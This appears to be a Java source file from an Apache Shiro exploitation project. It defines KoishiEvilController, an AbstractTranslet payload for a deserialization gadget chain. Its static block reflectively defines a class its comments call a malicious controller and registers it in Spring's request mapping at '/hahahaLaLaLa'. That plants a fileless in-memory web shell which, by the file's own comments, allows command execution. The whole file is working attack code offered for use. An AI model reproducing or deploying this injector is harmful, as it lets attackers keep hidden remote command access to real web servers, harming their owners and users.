package com.shiro.vuln.SpringMemShell.Controller;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.ibatis.javassist.ClassPool;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;


import java.lang.reflect.Method;


public class KoishiEvilController extends AbstractTranslet {
    static {
        try {
            String className = "com.shiro.vuln.SpringMemShell.Controller.InjectControl";
            //加载com.example.spring.InjectControl类的字节码
            /**
             *  加载我们的恶意 Controller 字节码
            * */
            byte[] bytes = ClassPool.getDefault().get(InjectControl.class.getName()).toBytecode();
            java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            java.lang.reflect.Method m0 = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
            m0.setAccessible(true);
            m0.invoke(classLoader, className, bytes, 0, bytes.length);

            /**
             * 获取上下文
            * */
            // first
//            WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();

            // second
//            WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());

            // third
//            WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());

            // fourth 从当前request属性中获取org.springframework.web.servlet.DispatcherServlet.CONTEXT, 其中对应的值为 AnnotationConfigServletWebServerApplicationContext
            WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());
            //WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

            // fifth
//            WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());


            /**
             * registerMapping 在 spring 4.0 及以后，可以使用 registerMapping 直接注册 requestMapping ，这是最直接的一种方式 ( 我2.6.6 也能注入进行就是好像会造成页面崩溃，但是不影响命令执行 )
             * */
            //从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
            RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
            //通过反射获得自定义controller中唯一的Method对象
            Method method = (Class.forName(className).getDeclaredMethods())[0];
            //定义访问controller的URL地址
            PatternsRequestCondition url = new PatternsRequestCondition("/hahahaLaLaLa");
            //定义允许访问 controller 的 HTTP 方法（GET/POST）
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            //在内存中动态注册 controller
            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
            r.registerMapping(info, Class.forName(className).newInstance(), method);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}